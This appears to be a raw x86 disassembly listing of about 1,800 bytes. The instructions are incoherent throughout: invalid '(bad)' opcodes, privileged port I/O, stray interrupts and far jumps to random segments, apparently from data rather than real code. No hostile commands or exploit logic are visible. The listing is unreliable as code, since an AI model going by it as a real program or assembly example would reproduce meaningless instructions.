  4175c2:	lods   al,BYTE PTR ds:[esi]
  4175c3:	dec    ecx
  4175c4:	pop    eax
  4175c5:	ret    
  4175c6:	int    0xd1
  4175c8:	retf   
  4175c9:	adc    BYTE PTR [edx],ah
  4175cb:	xor    bh,bl
  4175cd:	pop    esi
  4175ce:	fiadd  DWORD PTR [eax-0x7]
  4175d1:	add    DWORD PTR [edi+0x72],esp
  4175d4:	mul    DWORD PTR [esi-0x11]
  4175d7:	fwait
  4175d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175d9:	je     0x417577
  4175db:	xchg   ecx,eax
  4175dc:	pop    esp
  4175dd:	cli    
  4175de:	or     BYTE PTR [ebx],ch
  4175e0:	scas   eax,DWORD PTR es:[edi]
  4175e1:	mov    dh,0xd9
  4175e3:	xchg   esp,eax
  4175e4:	ret    0x8816
  4175e7:	inc    esp
  4175e8:	push   cs
  4175e9:	lea    edi,[ebp-0x63]
  4175ec:	shr    DWORD PTR [edx],cl
  4175ee:	ss jb  0x4175a3
  4175f1:	inc    esi
  4175f2:	icebp  
  4175f3:	and    al,0xcb
  4175f5:	pushf  
  4175f6:	cdq    
  4175f7:	ror    bh,1
  4175f9:	add    eax,DWORD PTR [edi]
  4175fb:	fistp  QWORD PTR [esi+0x74a7f526]
  417601:	test   DWORD PTR [eax],edx
  417603:	lea    esp,[eax-0x6a753dc]
  417609:	push   edi
  41760a:	sbb    DWORD PTR [ecx+0x35],ebp
  41760d:	xor    al,0xe1
  41760f:	fld    TBYTE PTR [eax-0x4806d96c]
  417615:	mov    WORD PTR [edi-0x2bb9c2d0],gs
  41761b:	bound  esp,QWORD PTR [edi+0x79]
  41761e:	pop    ds
  41761f:	and    edx,DWORD PTR [eax-0x2b]
  417622:	xchg   esi,eax
  417623:	retf   
  417624:	jmp    ebx
  417626:	mov    al,0xbb
  417628:	dec    esi
  417629:	inc    esi
  41762a:	std    
  41762b:	and    al,0x19
  41762d:	fdiv   QWORD PTR [edi+ebp*8+0x59]
  417631:	repnz sub ebp,0xdc7827bf
  417638:	dec    ebx
  417639:	lods   al,BYTE PTR ds:[esi]
  41763a:	xchg   edi,eax
  41763b:	mov    ebp,0x56621df0
  417640:	pop    ebp
  417641:	ins    DWORD PTR es:[edi],dx
  417642:	mov    dl,0x7f
  417644:	call   0xdbfd:0x7a9aa390
  41764b:	push   ebx
  41764c:	inc    edi
  41764d:	add    al,0x8b
  41764f:	xchg   BYTE PTR [ebx],bl
  417651:	daa    
  417652:	aas    
  417653:	sbb    ecx,DWORD PTR [edx+0x6f7e053e]
  417659:	mov    dl,BYTE PTR es:[ecx+0x1d]
  41765d:	pop    edi
  41765e:	cwde   
  41765f:	or     edi,DWORD PTR [ecx+0x57]
  417662:	daa    
  417663:	pushf  
  417664:	push   es
  417665:	pop    esp
  417666:	sbb    dl,BYTE PTR [eax+0x3e474274]
  41766c:	adc    BYTE PTR [esi],bh
  41766e:	repnz int 0x12
  417671:	lods   eax,DWORD PTR ds:[esi]
  417672:	cli    
  417673:	adc    BYTE PTR [eax],bl
  417675:	popf   
  417676:	imul   esp,DWORD PTR [ecx-0x1b],0xe2827ed8
  41767d:	adc    al,0xfe
  41767f:	push   ecx
  417680:	mov    bh,BYTE PTR [ebp+edi*8-0x7b3a6eca]
  417687:	fwait
  417688:	aas    
  417689:	push   0x90c6ff10
  41768e:	retf   0xc9c5
  417691:	cmc    
  417692:	push   edi
  417693:	popa   
  417694:	int    0x1c
  417696:	sbb    BYTE PTR [ebp+0x187b2e5a],cl
  41769c:	cmc    
  41769d:	mov    ch,0xc7
  41769f:	lea    ebx,[ecx+0x6cea3de1]
  4176a5:	add    BYTE PTR [ecx+0x2fd279f7],ah
  4176ab:	or     eax,0x81160a3c
  4176b0:	fwait
  4176b1:	xchg   edx,eax
  4176b2:	jg     0x41769d
  4176b4:	test   DWORD PTR [eax-0x22ad938b],esp
  4176ba:	and    ebp,ebp
  4176bc:	(bad)  
  4176bd:	imul   eax,esi,0x33
  4176c0:	fidivr DWORD PTR [ecx]
  4176c2:	out    0x9c,eax
  4176c4:	mov    bh,0xdf
  4176c6:	(bad)  
  4176c7:	mov    esp,0x9a78d966
  4176cc:	(bad)  
  4176cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176ce:	out    dx,eax
  4176cf:	ins    BYTE PTR es:[edi],dx
  4176d0:	aam    0x53
  4176d2:	ins    DWORD PTR es:[edi],dx
  4176d3:	adc    eax,0xd7d3f566
  4176d8:	(bad)  
  4176d9:	xchg   ebp,eax
  4176da:	sub    BYTE PTR [ecx],0x9
  4176dd:	pop    esi
  4176de:	and    bh,BYTE PTR [eax]
  4176e0:	sub    esi,eax
  4176e2:	mov    dl,0x49
  4176e4:	sub    al,0x93
  4176e6:	cmp    eax,0xd382b2c0
  4176eb:	xchg   edi,eax
  4176ec:	sti    
  4176ed:	dec    eax
  4176ee:	cmp    eax,0xcb33d9
  4176f3:	or     al,0x22
  4176f5:	loop   0x4176cb
  4176f7:	out    dx,al
  4176f8:	mov    bh,BYTE PTR [edi+0x36d7b718]
  4176fe:	cmp    DWORD PTR [edi+0x70],0x9ba76f36
  417705:	xor    DWORD PTR [ebp+0x48],ebp
  417708:	sub    al,0x8e
  41770a:	fidivr DWORD PTR [esp+eiz*4+0x72]
  41770e:	(bad)  
  41770f:	sub    BYTE PTR [ebx+0x76],ah
  417712:	sub    eax,0x10898492
  417717:	or     al,0x10
  417719:	xchg   ecx,edi
  41771b:	retf   0x9aa6
  41771e:	push   edi
  41771f:	or     al,0xd7
  417721:	inc    esp
  417722:	and    esp,edi
  417724:	pop    edx
  417725:	xor    DWORD PTR [edx-0x7ca58ed5],edi
  41772b:	sub    ch,BYTE PTR [eax+0x7a28f32d]
  417731:	cmc    
  417732:	jl     0x4176d1
  417734:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417735:	jnp    0x417722
  417737:	(bad)  
  417738:	xor    cl,BYTE PTR [edi]
  41773a:	out    dx,al
  41773b:	pop    ss
  41773c:	mov    edx,0x466ac7c4
  417741:	and    DWORD PTR [ebx-0x31],edx
  417744:	sar    ebp,cl
  417746:	push   cs
  417747:	sbb    dl,0xfd
  41774a:	jmp    0xbbdf:0x71d2532f
  417751:	mov    ebx,0xf6134772
  417756:	sbb    ecx,esi
  417758:	add    BYTE PTR [bx-0x3e],ch
  41775c:	into   
  41775d:	push   ebp
  41775e:	ror    BYTE PTR [edi-0x3a640edf],cl
  417764:	fbld   TBYTE PTR [esi]
  417766:	ins    DWORD PTR es:[edi],dx
  417767:	inc    ecx
  417768:	mov    ah,0x45
  41776a:	or     al,0x40
  41776c:	out    0x2d,al
  41776e:	fs dec ebp
  417770:	adc    dh,BYTE PTR [esi-0x30e9a06f]
  417776:	(bad)  
  417777:	out    0xc6,al
  417779:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41777a:	push   ds
  41777b:	jecxz  0x417799
  41777d:	iret   
  41777e:	xlat   BYTE PTR ds:[ebx]
  41777f:	aas    
  417780:	daa    
  417781:	shl    esp,1
  417783:	mov    BYTE PTR [edx-0x3a],ah
  417786:	cmp    eax,DWORD PTR [edi+0x4b766de7]
  41778c:	jns    0x417757
  41778e:	lods   al,BYTE PTR ds:[esi]
  41778f:	mov    al,ds:0x27c0dca1
  417795:	push   esi
  417796:	adc    BYTE PTR [ecx],al
  417798:	in     al,dx
  417799:	in     eax,dx
  41779a:	cmp    eax,0x7e6d19ee
  41779f:	sahf   
  4177a0:	imul   ebp,ebx,0xd
  4177a3:	cld    
  4177a4:	(bad)  
  4177a5:	iret   
  4177a6:	mov    al,ds:0x338c8d26
  4177ab:	(bad)  
  4177ac:	fsub   DWORD PTR [eax-0x5c]
  4177af:	outs   dx,DWORD PTR ds:[esi]
  4177b0:	addr16 push ss
  4177b2:	sbb    ah,BYTE PTR [ecx+0x66]
  4177b5:	push   ds
  4177b6:	(bad)  
  4177b7:	dec    eax
  4177b8:	mov    esi,0x1d788bde
  4177bd:	imul   BYTE PTR [edi-0x40337a39]
  4177c3:	std    
  4177c4:	xor    edi,DWORD PTR ds:0xe82a4c67
  4177ca:	daa    
  4177cb:	(bad)  
  4177cd:	xchg   ebx,eax
  4177ce:	inc    esi
  4177cf:	mov    BYTE PTR [edx-0x3],0x4d
  4177d3:	push   edx
  4177d4:	jmp    0xece8512
  4177d9:	xor    BYTE PTR [ecx],cl
  4177db:	jb     0x41780e
  4177dd:	sub    al,0xe5
  4177df:	adc    BYTE PTR [ebp+0x4b],bl
  4177e2:	jmp    FWORD PTR [edx-0x10da8049]
  4177e8:	jae    0x41777e
  4177ea:	jmp    0x8ebfd9f
  4177ef:	rcl    BYTE PTR [edi-0x7f6159fa],cl
  4177f5:	dec    ecx
  4177f6:	sbb    BYTE PTR [esi-0x7f],dh
  4177f9:	sbb    ch,BYTE PTR [ecx+0x4201cf90]
  4177ff:	outs   dx,BYTE PTR ds:[esi]
  417800:	lods   al,BYTE PTR ds:[esi]
  417801:	inc    esi
  417802:	pusha  
  417803:	bound  esp,QWORD PTR [ebp+0x685d28c8]
  417809:	es out 0x40,eax
  41780c:	ja     0x417858
  41780e:	and    BYTE PTR [edx-0x2a417d77],0xd7
  417815:	and    eax,0xbb1642eb
  41781a:	jb     0x417833
  41781c:	sbb    al,0xbd
  41781e:	push   esp
  41781f:	xchg   ebx,eax
  417820:	jmp    FWORD PTR [eax]
  417822:	pop    ds
  417823:	ins    BYTE PTR es:[edi],dx
  417824:	add    BYTE PTR [esi-0x485def83],bl
  41782a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41782b:	and    cl,bh
  41782d:	dec    edx
  41782e:	outs   dx,BYTE PTR ds:[esi]
  41782f:	fst    st(2)
  417831:	jge    0x41783f
  417833:	loop   0x4177f7
  417835:	sbb    al,0x4b
  417837:	add    eax,DWORD PTR [esi-0x2f]
  41783a:	inc    edx
  41783b:	gs adc esp,esp
  41783e:	jg     0x4178a0
  417840:	imul   edx,DWORD PTR [ebp-0x27c1c92a],0x78f19494
  41784a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41784b:	push   es
  41784c:	sbb    DWORD PTR [edi-0x58],edx
  41784f:	push   ebx
  417850:	jnp    0x4178bb
  417852:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417853:	jmp    0x41783b
  417855:	jp     0x417819
  417857:	call   0xdca4f635
  41785c:	sbb    BYTE PTR [ecx+0x75],dh
  41785f:	push   edx
  417860:	ins    DWORD PTR es:[edi],dx
  417861:	mov    edi,0xb52a9a3
  417866:	aaa    
  417867:	xlat   BYTE PTR ds:[ebx]
  417868:	mov    eax,ds:0x6b611ce2
  41786d:	fcomp  QWORD PTR [edx]
  41786f:	es jo  0x417819
  417872:	pop    ebp
  417873:	cmp    al,0xc0
  417875:	mov    DWORD PTR [ebx+0x219d3dda],esi
  41787b:	retf   0xf924
  41787e:	add    ch,ch
  417880:	cmc    
  417881:	call   0x390d:0xb03457ee
  417888:	xchg   esp,eax
  417889:	mov    edi,0x70ba425b
  41788e:	pop    esi
  41788f:	add    al,0xa9
  417891:	out    dx,al
  417892:	mov    ebx,DWORD PTR [ebp+0x7383b07f]
  417898:	icebp  
  417899:	ds xor al,0x1
  41789c:	fdiv   DWORD PTR [ebp-0x55]
  41789f:	jb     0x417907
  4178a1:	(bad)  
  4178a2:	fsubr  DWORD PTR [edx+0x66]
  4178a5:	pop    esi
  4178a6:	mov    esp,0xb406ed93
  4178ab:	jbe    0x417924
  4178ad:	inc    BYTE PTR [edx]
  4178af:	jge    0x417865
  4178b1:	xor    al,0xf6
  4178b3:	jo     0x41785c
  4178b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178b6:	jge    0x4178c4
  4178b8:	cmp    al,0xbc
  4178ba:	popa   
  4178bb:	aaa    
  4178bc:	jge    0x417917
  4178be:	call   0xeefb98c6
  4178c3:	out    dx,eax
  4178c4:	popf   
  4178c5:	pop    ebp
  4178c6:	jns    0x417895
  4178c8:	xchg   esi,eax
  4178c9:	add    DWORD PTR [ebp-0x1a],edi
  4178cc:	imul   bh
  4178ce:	lahf   
  4178cf:	mov    bh,0xad
  4178d1:	std    
  4178d2:	adc    DWORD PTR ds:[edx-0xe],esp
  4178d6:	adc    dl,BYTE PTR [ebx+0x19a2acf7]
  4178dc:	or     DWORD PTR [edi+0x6a],0x229e8849
  4178e3:	inc    esi
  4178e4:	out    dx,eax
  4178e5:	sub    al,0x3c
  4178e7:	xchg   esp,eax
  4178e8:	sub    esi,DWORD PTR [esp+ebx*1+0x19fb289d]
  4178ef:	pop    esi
  4178f0:	inc    esi
  4178f1:	gs add eax,0x58b78d3a
  4178f7:	mov    ecx,0x6d4d5528
  4178fc:	push   ebp
  4178fd:	and    DWORD PTR [ebx+esi*4-0x3b565106],esi
  417904:	sti    
  417905:	sub    edi,DWORD PTR [edi+0x69]
  417908:	shl    BYTE PTR [edi+0x56],1
  41790b:	sub    dh,bh
  41790d:	sbb    BYTE PTR [eax+0x3b],dl
  417910:	test   al,0x4
  417912:	out    0x76,al
  417914:	ins    DWORD PTR es:[edi],dx
  417915:	mov    esp,0xc5cdaaf3
  41791a:	push   esi
  41791b:	mov    eax,0x15fe6cec
  417920:	jns    0x4178f0
  417922:	adc    dl,dl
  417924:	and    cl,BYTE PTR [ebx+edx*2]
  417927:	rcl    BYTE PTR [esi-0x75de572c],cl
  41792d:	xchg   ebx,ecx
  41792f:	adc    eax,0x94945cbf
  417934:	push   edx
  417935:	aad    0x5a
  417937:	mov    dl,0x64
  417939:	test   al,0xf5
  41793b:	rcr    BYTE PTR [edx+0x56],cl
  41793e:	mov    ebp,0x685f9a66
  417943:	add    edx,DWORD PTR [ecx+0x12388fa5]
  417949:	(bad)  
  41794a:	xchg   esi,eax
  41794b:	sbb    DWORD PTR [esi+0x43eab72f],esi
  417951:	push   ebp
  417952:	mov    esp,0x66fb00d7
  417957:	dec    edx
  417958:	mov    bl,0xa8
  41795a:	popf   
  41795b:	lahf   
  41795c:	push   esi
  41795d:	inc    ebp
  41795e:	fwait
  41795f:	mov    bl,0x8e
  417961:	dec    eax
  417962:	leave  
  417963:	lock js 0x4179bb
  417966:	inc    ecx
  417967:	or     DWORD PTR [esi-0x6f],ebp
  41796a:	fld    QWORD PTR [eax+0x4f]
  41796d:	cs pop edi
  41796f:	iret   
  417970:	aam    0xb8
  417972:	dec    ebx
  417973:	cwde   
  417974:	adc    BYTE PTR [esi+0x6d],bl
  417977:	push   esi
  417978:	sbb    BYTE PTR [ebx+0x39c6ae6],al
  41797e:	enter  0x9e37,0x56
  417982:	pop    ebx
  417983:	cmp    cl,BYTE PTR ds:[edx+0x6c]
  417987:	xor    eax,0x5dea3fa
  41798c:	push   ebx
  41798d:	mov    ds:0xf1af2cbc,eax
  417992:	sub    al,0xd5
  417994:	and    DWORD PTR [ecx],edi
  417996:	add    DWORD PTR [ebx+eax*2-0x61],esi
  41799a:	xor    eax,DWORD PTR [esi-0x1f]
  41799d:	pop    esi
  41799e:	rol    DWORD PTR [ecx-0x43],1
  4179a1:	lea    ebp,[ebx]
  4179a3:	mov    DWORD PTR [ebx-0x7f],esi
  4179a6:	loopne 0x417974
  4179a8:	cmp    ecx,DWORD PTR [ecx+0xe42579d]
  4179ae:	mov    ah,0x49
  4179b0:	jle    0x4179d2
  4179b2:	or     BYTE PTR [edx-0x48],dh
  4179b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179b6:	push   ss
  4179b7:	jle    0x4179bc
  4179b9:	fnsave [esi-0x73]
  4179bc:	cdq    
  4179bd:	imul   edi,ebp,0xb3a23b0e
  4179c3:	aam    0x81
  4179c5:	inc    edx
  4179c6:	xlat   BYTE PTR ds:[ebx]
  4179c7:	mov    al,0x33
  4179c9:	repz (bad) 
  4179cb:	imul   eax,DWORD PTR [ebp+0x5],0xe8c8f9a5
  4179d2:	das    
  4179d3:	icebp  
  4179d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179d5:	jle    0x4179a2
  4179d7:	dec    ebx
  4179d8:	mov    bh,0xa8
  4179da:	mov    esp,0x69d710b8
  4179df:	xchg   esi,eax
  4179e0:	pusha  
  4179e1:	test   DWORD PTR [eax+0x4f953120],0xa0e47b4e
  4179eb:	add    DWORD PTR [esi],esi
  4179ed:	icebp  
  4179ee:	and    DWORD PTR [edi],esp
  4179f0:	sub    al,0xbe
  4179f2:	and    esi,DWORD PTR [eax]
  4179f4:	(bad)  
  4179f5:	std    
  4179f6:	push   es
  4179f7:	or     ah,BYTE PTR [edi*2-0x2ad0779f]
  4179fe:	jmp    0xb4888367
  417a03:	mov    esi,0x79821ee1
  417a08:	int3   
  417a09:	lea    ebp,[ecx-0x39a4372]
  417a0f:	call   0x4e2:0xeae8b29a
  417a16:	adc    DWORD PTR [esi+0x59],esi
  417a19:	add    ebp,DWORD PTR [eax]
  417a1b:	out    0xe,al
  417a1d:	inc    ecx
  417a1e:	fisttp QWORD PTR [edi+0xbf6da7b]
  417a24:	push   edi
  417a25:	cwde   
  417a26:	add    BYTE PTR [ebp+0x12],al
  417a29:	sbb    DWORD PTR [edi],ebp
  417a2b:	stos   BYTE PTR es:[edi],al
  417a2c:	mov    esp,0x3b2da579
  417a31:	es cdq 
  417a33:	test   BYTE PTR [ebx],bl
  417a35:	fsub   DWORD PTR [esi]
  417a37:	(bad)  
  417a38:	sbb    DWORD PTR ds:0xf7e56f34,eax
  417a3e:	iret   
  417a3f:	retf   0x979b
  417a42:	sub    ah,BYTE PTR [ebx-0x6eb9342a]
  417a48:	sbb    DWORD PTR [edi+0x25],ebp
  417a4b:	push   es
  417a4c:	mov    cl,0xf5
  417a4e:	sbb    eax,0x4fee3969
  417a53:	mov    ebx,0x44124a66
  417a58:	dec    esp
  417a59:	sbb    al,0x4a
  417a5b:	sbb    eax,0x75357f33
  417a60:	imul   edi,eax,0xbfbfbf50
  417a66:	push   ebp
  417a67:	shl    BYTE PTR [ecx+0x56],cl
  417a6a:	and    eax,0x4f95f112
  417a6f:	outs   dx,BYTE PTR ds:[esi]
  417a70:	sbb    DWORD PTR ds:0x15e21ae5,esi
  417a76:	cli    
  417a77:	fidivr DWORD PTR [esi+0x61]
  417a7a:	sub    DWORD PTR ds:[ebp-0x16eec3f7],edx
  417a81:	and    ah,bh
  417a83:	mov    eax,0x16c66907
  417a88:	push   0x19
  417a8a:	pop    esp
  417a8b:	push   ebx
  417a8c:	aad    0x14
  417a8e:	adc    ecx,DWORD PTR [esi]
  417a90:	inc    ecx
  417a91:	in     al,dx
  417a92:	mov    esp,0xdaff66f9
  417a97:	push   es
  417a98:	shl    BYTE PTR [eax],1
  417a9a:	and    edx,DWORD PTR [ecx-0x53]
  417a9d:	or     eax,0xd445c447
  417aa2:	fs inc ecx
  417aa4:	(bad)  
  417aa5:	fisttp QWORD PTR [eax+0x6bc60689]
  417aab:	loopne 0x417b04
  417aad:	repz add al,0x2
  417ab0:	(bad)  
  417ab1:	pop    ecx
  417ab2:	pop    ecx
  417ab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ab4:	push   esi
  417ab5:	xlat   BYTE PTR ds:[ebx]
  417ab6:	das    
  417ab7:	sbb    DWORD PTR [esi-0x2aaece4b],ecx
  417abd:	jbe    0x417ada
  417abf:	inc    esi
  417ac0:	mov    al,ds:0xf5850c75
  417ac5:	inc    ecx
  417ac6:	sbb    al,0xf4
  417ac8:	jmp    0x417b1b
  417aca:	popf   
  417acb:	out    dx,eax
  417acc:	mov    ch,0x86
  417ace:	add    al,0xe7
  417ad0:	inc    ebp
  417ad1:	icebp  
  417ad2:	pop    edi
  417ad3:	sub    BYTE PTR [eax-0x45],bl
  417ad6:	push   ebx
  417ad7:	pop    ds
  417ad8:	mov    ch,0xfd
  417ada:	and    DWORD PTR [edi-0x4840f16],ebx
  417ae0:	xchg   esi,eax
  417ae1:	data16 int 0xd6
  417ae4:	push   edx
  417ae5:	fwait
  417ae6:	pop    eax
  417ae7:	push   0x52
  417ae9:	cmp    bh,ch
  417aeb:	cmp    bl,0xb8
  417aee:	mov    ch,0xbe
  417af0:	icebp  
  417af1:	xor    dh,BYTE PTR gs:[di]
  417af5:	jns    0x417b31
  417af7:	cwde   
  417af8:	leave  
  417af9:	loop   0x417a97
  417afb:	mov    dh,0xb3
  417afd:	jecxz  0x417a97
  417aff:	xchg   edi,eax
  417b00:	fld    DWORD PTR [edx-0x3d4106c8]
  417b06:	fild   QWORD PTR [esp+ebx*1-0x36]
  417b0a:	cmp    BYTE PTR [esi],dl
  417b0c:	mov    ds:0x6249d7f,al
  417b11:	cs and ch,dh
  417b14:	popf   
  417b15:	push   ebp
  417b16:	(bad)  
  417b17:	mov    cl,0xbf
  417b19:	cmp    BYTE PTR [esi+0x53295ec],0xee
  417b20:	cmc    
  417b21:	stos   BYTE PTR es:[edi],al
  417b22:	jecxz  0x417b07
  417b24:	xchg   ebp,eax
  417b25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b26:	and    bh,BYTE PTR [ebx+0x52da677]
  417b2c:	mov    ecx,0x80d03d26
  417b31:	sbb    BYTE PTR [esi+esi*1-0x1e57c012],dl
  417b38:	add    BYTE PTR [esp+ecx*1+0x49],al
  417b3c:	cmp    dh,BYTE PTR [ebx+0x62]
  417b3f:	ja     0x417bb9
  417b41:	mov    eax,ss
  417b43:	add    DWORD PTR [ecx-0x78df44e],ecx
  417b49:	sbb    ch,BYTE PTR [esi+0x59]
  417b4c:	push   ecx
  417b4d:	mov    ah,0x1b
  417b4f:	rcr    edi,cl
  417b51:	lock inc ebx
  417b53:	pop    ecx
  417b54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b55:	mov    ebp,0xe2e51f1a
  417b5a:	sub    al,0x18
  417b5c:	add    eax,0xa95c746e
  417b61:	or     eax,0x29ef2fd4
  417b66:	adc    eax,0x75af95de
  417b6b:	dec    esi
  417b6c:	and    esp,edi
  417b6e:	cld    
  417b6f:	inc    edx
  417b70:	xor    ch,ch
  417b72:	sub    eax,DWORD PTR [ebx-0x623c3acc]
  417b78:	xchg   DWORD PTR [edx+0x3c],eax
  417b7b:	lods   al,BYTE PTR ds:[esi]
  417b7c:	shl    BYTE PTR [edx+0x32],1
  417b7f:	repz aam 0xc
  417b82:	or     al,cl
  417b84:	dec    ebx
  417b85:	mov    WORD PTR [esi],ss
  417b87:	push   edx
  417b88:	and    al,0x87
  417b8a:	adc    BYTE PTR [ecx],al
  417b8c:	out    0xa1,eax
  417b8e:	pop    ecx
  417b8f:	ficom  WORD PTR [edx+edx*4+0x4a]
  417b93:	neg    BYTE PTR [ebx-0xc]
  417b96:	adc    esp,DWORD PTR [edx]
  417b98:	pop    esp
  417b99:	xchg   DWORD PTR [esi+0x3e1b9a7b],ebp
  417b9f:	rcr    ah,0x1a
  417ba2:	rol    esi,0x7f
  417ba5:	das    
  417ba6:	xchg   esi,eax
  417ba7:	add    eax,0x2254093f
  417bac:	cld    
  417bad:	cmp    al,0xd4
  417baf:	mov    dl,ah
  417bb1:	cmp    eax,0xba470e95
  417bb6:	inc    ecx
  417bb7:	rcl    cl,cl
  417bb9:	and    ebx,DWORD PTR [edi+0x169436b8]
  417bbf:	xchg   edi,eax
  417bc0:	inc    eax
  417bc1:	mov    ah,0xfe
  417bc3:	inc    eax
  417bc4:	test   BYTE PTR [esi+0x62],ch
  417bc7:	iret   
  417bc8:	into   
  417bc9:	mov    ecx,0xa0732b07
  417bce:	mov    edi,0xd808ae1d
  417bd3:	cmp    eax,0xcdf4400a
  417bd8:	mov    ah,0x57
  417bda:	xchg   ebx,eax
  417bdb:	bound  esp,QWORD PTR [edx]
  417bdd:	jae    0x417c46
  417bdf:	cmc    
  417be0:	lock mov esp,0x253db323
  417be6:	mov    dl,0x75
  417be8:	dec    ebx
  417be9:	push   edx
  417bea:	cmp    eax,edi
  417bec:	(bad)  
  417bed:	loope  0x417bcc
  417bef:	mov    eax,0xa7cde99a
  417bf4:	mov    ds:0xbb1dd937,eax
  417bf9:	sub    DWORD PTR [ebx+esi*1-0x1d],ebx
  417bfd:	jmp    0xe2cedbf9
  417c02:	icebp  
  417c03:	jae    0x417b9f
  417c05:	push   edi
  417c06:	ret    0xfa67
  417c09:	add    ebp,DWORD PTR [edi-0x52]
  417c0c:	in     eax,dx
  417c0d:	fcom   QWORD PTR [esp+ebx*1]
  417c10:	out    dx,al
  417c11:	test   DWORD PTR [esi],ebp
  417c13:	mov    eax,ds:0x8ebdb1ba
  417c18:	mov    ds:0x258c8ae2,eax
  417c1d:	adc    eax,0xf684722d
  417c22:	loope  0x417c3f
  417c24:	aam    0xfe
  417c26:	jmp    0x417c0d
  417c28:	jne    0x417c25
  417c2a:	dec    esp
  417c2b:	inc    edi
  417c2c:	outs   dx,BYTE PTR ds:[esi]
  417c2d:	call   0xdc3480f5
  417c32:	out    0xd5,eax
  417c34:	cmp    ebx,edi
  417c36:	inc    ecx
  417c37:	call   0xca9c:0x8554b981
  417c3e:	mov    al,0xf6
  417c40:	xor    DWORD PTR [edx],ecx
  417c42:	jae    0x417c0d
  417c44:	cwde   
  417c45:	push   ss
  417c46:	xchg   esi,eax
  417c47:	push   0xffffffd2
  417c49:	xchg   ebx,eax
  417c4a:	in     eax,dx
  417c4b:	mov    ch,0xc8
  417c4d:	test   DWORD PTR [edi],esp
  417c4f:	mov    bh,0x3d
  417c51:	push   ebp
  417c52:	out    dx,eax
  417c53:	aaa    
  417c54:	mov    eax,ds:0x8d705ff4
  417c59:	out    dx,eax
  417c5a:	jne    0x417cd8
  417c5c:	push   ebp
  417c5d:	lock (bad) 
  417c60:	pop    ebx
  417c61:	shl    dh,1
  417c63:	mul    ebx
  417c65:	sar    DWORD PTR [ecx+esi*2],1
  417c68:	cmp    esp,esi
  417c6a:	inc    eax
  417c6b:	dec    edx
  417c6c:	dec    edx
  417c6d:	adc    DWORD PTR [eax],ebx
  417c6f:	mov    eax,ds:0x7c3360bd
  417c74:	cmp    al,0x52
  417c76:	rcl    BYTE PTR [ebx-0x1c],cl
  417c79:	push   0xbacce08
  417c7e:	add    DWORD PTR [eax],ebp
  417c80:	xchg   edx,eax
  417c81:	arpl   bp,di
  417c83:	out    dx,al
  417c84:	imul   ebp,DWORD PTR [ebx],0xfffffff9
  417c87:	push   ecx
  417c88:	push   edx
  417c89:	xchg   BYTE PTR ds:[ebx],bl
  417c8c:	retf   
  417c8d:	xchg   ebx,eax
  417c8e:	and    edi,DWORD PTR [eax]
  417c90:	je     0x417c4e
  417c92:	call   0x5e6403c1
  417c97:	fsubrp st(1),st
  417c99:	inc    esp
  417c9a:	js     0x417cca
  417c9c:	or     DWORD PTR [edx+0x4b658c14],0xc88fd507
  417ca6:	pop    eax
  417ca7:	sar    ebx,1
  417ca9:	sbb    ebx,DWORD PTR [ebx+0x2]
  417cac:	imul   esp,ebx,0xc92671dc
  417cb2:	gs inc ebp
  417cb4:	and    cl,bh
  417cb6:	push   esp
  417cb7:	adc    al,0x2e
  417cb9:	repnz add DWORD PTR [ecx-0x222b0acb],esi
  417cc0:	xor    edx,DWORD PTR [esi]
  417cc2:	(bad)  
  417cc3:	mov    WORD PTR [ebx],cs
  417cc5:	mov    ch,0xdb
  417cc7:	ret    
  417cc8:	xchg   edx,eax
  417cc9:	lahf   
  417cca:	inc    edx
  417ccb:	in     eax,0x11
  417ccd:	loope  0x417d3f
  417ccf:	scas   al,BYTE PTR es:[edi]
  417cd0:	jbe    0x417cac
  417cd2:	clc    
  417cd3:	out    0x92,eax
  417cd5:	mov    ds:0x1dc1eb76,eax
  417cda:	push   edx
  417cdb:	xor    al,0x88
  417cdd:	das    
  417cde:	call   0xeab28555
  417ce3:	sub    al,0xd2
  417ce5:	cmc    
  417ce6:	inc    esp
  417ce7:	or     DWORD PTR [eax+ebx*4-0x2d],esp
  417ceb:	fistp  WORD PTR [edx-0x59]
  417cee:	outs   dx,BYTE PTR ds:[esi]
  417cef:	cmove  eax,DWORD PTR [eax+0x63b26e0d]
  417cf6:	xchg   ebp,eax
  417cf7:	or     al,0x3d
  417cf9:	adc    BYTE PTR [esi],cl
  417cfb:	add    bl,cl
  417cfd:	addr16 push edi
  417cff:	fld    DWORD PTR [ecx-0x74cbd520]
  417d05:	cdq    
  417d06:	jmp    0xd028:0x72cb5f03
  417d0d:	or     al,0xd9
  417d0f:	or     BYTE PTR [ebp-0x4fa25833],cl
  417d15:	push   es
  417d16:	test   DWORD PTR [esi+0x7],edi
  417d19:	es jae 0x417cb4
  417d1c:	jbe    0x417d10
  417d1e:	fs mov ch,0x2a
  417d21:	sbb    eax,0x47836cf3
  417d26:	inc    ecx
  417d27:	out    0x83,eax
  417d29:	inc    ebx
  417d2a:	pop    ds
  417d2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d2c:	clc    
  417d2d:	test   DWORD PTR [esi],ebx
  417d2f:	(bad)
  417d33:	ja     0x417d36
  417d35:	sub    ah,ch
  417d37:	loope  0x417d14
  417d39:	ror    DWORD PTR [edx+0x37],0x6a
  417d3d:	mov    al,0x9d
  417d3f:	inc    edx
  417d40:	int    0xef
  417d42:	push   0xffffffaf
  417d44:	ror    DWORD PTR [esi-0x2e],cl
  417d47:	push   ebp
  417d48:	pop    ebp
  417d49:	ins    DWORD PTR es:[edi],dx
  417d4a:	dec    ebx
  417d4b:	pop    ss
  417d4c:	sub    dl,bl
  417d4e:	aaa    
  417d4f:	mov    ah,BYTE PTR [ecx]
  417d51:	(bad)  
  417d52:	(bad)  [edx]
  417d54:	inc    esi
  417d55:	adc    dh,al
